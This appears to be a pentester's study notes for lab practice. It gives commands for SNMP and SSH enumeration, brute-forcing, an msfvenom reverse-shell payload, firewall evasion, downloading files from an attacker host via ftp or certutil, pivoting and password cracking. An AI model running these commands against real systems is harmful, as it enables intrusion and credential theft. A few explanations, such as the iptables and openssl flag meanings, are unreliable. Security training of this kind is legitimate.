<----------------------------NETWORK PENTESTING----------------------------->

VYOS Configuration:
configure
set interfaces ethernet eth0 address 192.168.29.10/24
set service snmp community public authorization ro
set service snmp community private authorization rw
set system login user admin authentication plain-password aaaa
set service ssh allow-root
commit 
save


SNMP Enumeration:
In this we are going to find what are the services running in vyos.
Port 161 is the default snmp port.
script : --->  nmap -n -Pn -p161 -sU -sC 192.168.29.10
The above script will give us the snmp information.

-sC will give snmp info only if the read only string is set to public in the target machine.
set service snmp community <public> authorization ro
In the above command, if the string is set to something other than public then we won't get any info.


Bruteforcing SNMP strings:
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.29.10
With this metasploit module we can scan and get the snmp information.

msf6 auxiliary(scanner/snmp/snmp_login) > setg RHOSTS 192.168.29.10
With this module we can bruteforce snmp login.


Bruteforcing SNMP login:
We are going to Bruteforce the snmp login using hydra.
hydra -P /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt snmp://192.168.29.10


SNMP Post Exploitation:
After getting the SNMP strings we can get the information from router.
In SNMP protocol, OID means an "Object Identifier."
To define OID, it's an address used to uniquely identify managed devices and their statuses. Want to know the temperature reading coming from a sensor at your mountaintop remote facility? There's an OID for that.

snmpwalk -v1 -c public 192.168.29.10
v1 - version 1
c - community string
The above command will give you the router information.
Information includes OID tree.
The information we got is full of numbers and we can't understand.
So to read the information properly you have to edit the snmp.conf file and comment all lines.
" sudo nano /etc/snmp/snmp.conf "

--------------------------------------------------------------------------------------------------


SSH Enumeration:
nmap -n -v -p22 -sV 192.168.29.10 
The above command will find all info about ssh.

nmap -n -v -p22 -sV --script=ssh2-enum-algos 192.168.29.10
This nmap script will find the algorithms used in ssh.


Bruteforcing SSH:
msf6 auxiliary(scanner/ssh/ssh_login) > setg RHOSTS 192.168.29.10
This metasploit module is used to bruteforce ssh login.

hydra -P passwords.txt -L users.txt ssh://192.168.29.10
THis is a way to bruteforce ssh using Hydra.
--------------------------------------------------------------------------------------------------


Wget:
wget is a command line program used to retrieve content from web servers.
We can get any resources from web servers using wget.
wget https://google.com 

Curl:
cURL stands for Client URL.
It is a command line tool used for transferring data, that is used to download files, send requests etc.

VSFTPD:
It is a FTP server for unix like systems. 
sudo service vsftpd start
ftp 192.168.29.210
Now you can download files from ftp server to other machine.


Python Server:
We can host files using Python Simple HTTP server.
It is similar like FTP server.

python2 -m SimpleHTTPServer 1234
python3 -m http.server 1234
Use the above command to start Python server. Run any one of the command according to your python version and the client's python version.

wget 192.168.29.210:1234/req3.txt
Use wget to download files from the Python server.

-----------------------------------------------------------------------------------------------


msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.0.210 LPORT=8080 -a x86 -b "\x00\x0a\x0d" -f exe > http.exe
This reverse http payload will use port 80 or 8080 to connect from the target machine to our machine.
We use this http payload because sometimes firewall may block outbound connections on most of the ports, but http ports are always allowed.
If the target received an outbound connection from port 8080, then firewall allows this.
The target's machine is connected to our machine in our port 8080.


IP Tables:
iptables is a command-line firewall utility in linux that uses policy chains to allow or block traffic.
Chain INPUT means inbound connections.
Chain OUTPUT means outbound connections.
Chain FORWARD is for port forwarding 

Bypassing Firewall:
If the victim blocked the ports 4000-4500 in outbound connections, then the attacker could not make the victim machine to connect to port 4444 in the the attackers machine.
So we can bypass firewall rules by the below command.

sudo iptables -A PREROUTING -t nat -p tcp --dport 4000:5000 -j REDIRECT --to-port 4444
A - allow
t - table to change
p - protocol
--dport - destination ports
4000:5000 - from port 4000 to 5000
j - Specify action
--to-port - Forwarded to this port


Upgrading to tty shell:
We are going to see how to spawn a tty shell from a normal shell.
tty stands for teletype, popularly known as terminal.
Difference betweeen shell and terminal is that shell is a commond line interpreter whereas terminal is a program that runs a shell and allows us to enter commands.

When you get the shell, type "which python" command to check the python version.
And now run this command to upgrade your normal shell to tty shell.
python -c 'import pty; pty.spawn("/bin/bash")'

If the target machine don't have any known languages installed, then run the below command to upgrade to tty shell.
/usr/bin/script -qc /bin/bash /dev/null

Reference:
https://github.com/gajos112/OSCP/blob/master/Spawning%20TTY%20Shell


Searchsploit:
It is a command-line search tool for Exploit-DB.
It will get the results from Exploit database.


File searching in Windows system:
cls -  to clear screen
dir /?   - This command gives you more info about dir cmd in windows shell.
dir vapt.txt /s  - This command will search for a file in every directory.
dir *.txt /s /p - This command will search for all text files and it will pause the output if the results are lengthy.

dir a:d  - This command will only show all the directory in the current location. 'a' for attributr and 'd' for directory.
dir a:-d  - This command will only show all the files other than directory in the current location.
dir a:h  - This command will only show all the hidden files & directory in the current location.

more flag.txt - This command will print the contents in the file.
find "flag" flag.txt  - This command will search for the specific keyword inside the text file.

type flag.txt | find "" /v /c 
Thw above command will count all the lines inside the file.
/v means not 
/c means count
So don't count empty empty strings which means this command will gives us the no.of lines

--------------------------------------------------------------------------------------------------
FTP commands in Windows shell:
echo open <attacker-ip> 21 > ftp.txt
echo USER kali >> ftp.txt
echo kali >> ftp.txt
echo bin >> ftp.txt
echo GET <filename> >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
The above command will execute all the ftp commands that are inside the ftp.txt file
-v  = verbose
-s  = script to execute

wce32.exe and pwdump.exe is file used to get password hashes from the windows system
-----------------------------------------------------------------------------------------------


Creating a Wordlist:
crunch is a wordlist generating tool.
crunch 1 3 ab2 > wordlist.txt
This will give you a list of words with min len of 1 and max len 3 with the chars ab2.

CeWL (Custom Word List generator) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper
---------------------------------------------------------------------------------------------


Pivoting a network with metasploit:

So you got shell access to the target machine, but you don't know if there are any other machines active in the same network. If there is a machine active in the network of the target machine, then you can access that machine by creating a route. The process is called pivoting. Without pivoting you can't access the other machine from target machine.

First get meterpreter shell from the target machine.
meterpreter > ifconfig
Now you got the ip subnet details. 
meterpreter > run autoroute -s 192.168.29.1/24
Here we are using autoroute to create a route to all machines that is inside the same network as of the target.
meterpreter > bg
bg to create a background session. Now use exploit/multi/handler.
exploit(multi/handler) > route print
"route print" will show the ipv4 routing table.

exploit(multi/handler) > use auxiliary/scanner/portscan/tcp 
exploit(multi/handler) > set RHOST 192.168.29.135
exploit(multi/handler) > run
Now you can scan that other machine ports.
-------------------------------------------------------------------------------------------------


Identifying Hashes:
hash-identifier is a tool to identify the hash algorithm used in a hash value.
https://www.onlinehashcrack.com/
This is another site where you can identify the hash algorithm.


OpenSSL:
Openssl is a command-line tool that is commonly used to generate private keys, cipher a text, install ssl/tls certificate and identify certificate info.

openssl list -cipher-commands
echo "hello world" > plain
openssl enc -base64 -in plain.txt -out cipher.txt
"aGVsbG8gd29ybGQK" This is the base64 encoded value.
enc  - encryption
in  - input file
out - output file
openssl enc -base64 -d -in cipher.txt -in 
The above command is used to decode a cipher text

openssl genrsa -out keypair 2048
This command will generate a rsa key

openssl rsa -in keypair -pubout
This command will give the public key from the private key file.

openssl passwd -1 -salt kali kali 
passwd uses DES algorithm.
The above cmd will give the des encrypted value of the user and pass kali.
By this you can change the /etc/passwd value.
-------------------------------------------------------------------------------------------


JohnTheRipper:
It is a tool used to crack passwords and hashes.

sudo john --list=formats
This will list all the formats that this tool can crack.

sudo john --format=raw-sha1 crack.txt
--format is the algorithm
crack.txt contains the hash value.
This cmd is used to crack the hash value.


Mimikatz:
It is a tool that is used to extract passwords stored in memory, extracts plaintext pass, hash, extract kerberos tickets from memory.
---------------------------------------------------------------------------------------------------


Windows File Transfers:

If python is there in the windows machine check its version. If its python3 then run the below cmd in your linux machine.
python -m http.server
Now go to the windows machine and install wget python module using below cmd.
python -m pip install wget
Now run the below cmd to download the files from linux machine.
python -m wget http://192.168.19.210:8000/<filename>

certutil -urlcache -f http://192.168.0.103:8000:/flag.txt
Try the above cmd to transfer files

powershell invoke-webrequest http://192.168.0.103:8000/flag.txt -outfile '.\flag.txt'
This is a way to download files .

python3 -m pyftpdlib
Run this cmd on linux machine to start ftp server

metasploit tftp module:
auxiliary/server/tftp 
The above module is used to transfer files.

